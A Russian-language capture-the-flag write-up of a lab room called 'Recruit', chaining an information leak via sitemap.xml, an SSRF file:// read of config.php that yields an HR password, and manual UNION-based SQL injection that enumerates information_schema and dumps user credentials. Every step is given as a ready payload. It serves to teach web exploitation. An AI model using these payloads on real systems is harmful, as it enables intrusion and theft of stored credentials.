# Write-up: Recruit (SSRF → SQLi)

Комната, где главное — понять SSRF и SQL-инъекцию.

## 1. Разведка

Нас просят логин и пароль. Осматриваем сайт и замечаем API:

![API](img/Pasted_image_20260730143355.png)

![API запрос](img/Pasted_image_20260730143500.png)

Понимаем, что можно использовать SSRF-уязвимость, но пока не знаем, какой именно файл нам нужен.

## 2. Поиск эндпоинтов

Ищем эндпоинты: `/sitemap.xml` — здесь видно вообще все:

![sitemap.xml](img/Pasted_image_20260730143618.png)

Особое внимание на Mail — там находим:

![Mail](img/Pasted_image_20260730143740.png)

Уже знаем username: `hr`. И знаем, что пароль есть в `config.php`.

## 3. SSRF

Используем SSRF-уязвимость:

```text
http://10.144.158.71//file.php?cv=file:///var/www/html/config.php
```

Получаем:

![config.php](img/Pasted_image_20260730144154.png)

```php
$HR_PASSWORD = 'hrpassword123';
```

Заходим:

![Вход](img/Pasted_image_20260730144306.png)

## 4. Проверка на SQLi

Проверяем форму на SQL-инъекцию:

![SQLi проверка](img/Pasted_image_20260730144332.png)

Удачно. Теперь есть два пути: вручную или через `sqlmap`. Давайте вручную.

## 5. Определение числа столбцов

```sql
' ORDER BY 1 -- -
' ORDER BY 5 -- -
```

Определяем количество столбцов — получилось 4:

![ORDER BY 1](img/Pasted_image_20260730144505.png)

![ORDER BY 5](img/Pasted_image_20260730144517.png)

## 6. UNION-инъекция

```sql
' UNION SELECT 1,2,3,4 -- -
```

Проверяем UNION-уязвимость:

![UNION SELECT](img/Pasted_image_20260730144711.png)

## 7. Перечисление баз данных

```sql
' UNION SELECT 1,2,GROUP_CONCAT(schema_name),4 FROM information_schema.schemata -- -
```

Копаем глубже, смотрим доступные БД:

![Базы данных](img/Pasted_image_20260730144859.png)

## 8. Перечисление таблиц

```sql
' UNION SELECT 1,2,GROUP_CONCAT(table_name),4 FROM information_schema.tables WHERE table_schema='recruit_db' -- -
```

Смотрим названия таблиц в конкретной БД:

![Таблицы](img/Pasted_image_20260730145053.png)

## 9. Перечисление столбцов

```sql
' UNION SELECT 1,2,GROUP_CONCAT(column_name),4 FROM information_schema.columns WHERE table_name='users' -- -
```

Все столбцы в таблице `users`:

![Столбцы](img/Pasted_image_20260730145731.png)

## 10. Дамп кредов

```sql
' UNION SELECT 1,2,GROUP_CONCAT(username,0x3a,password),4 FROM users -- -
```

Все логины и пароли из таблицы `users`:

![Дамп users](img/Pasted_image_20260730145845.png)

![Результат](img/Pasted_image_20260730145920.png)

Win.

## Итоговая схема (Kill Chain)

`sitemap.xml (info leak)` → `SSRF (file:/// → config.php)` → `HR creds` → `SQLi (UNION-based)` → `users dump` → win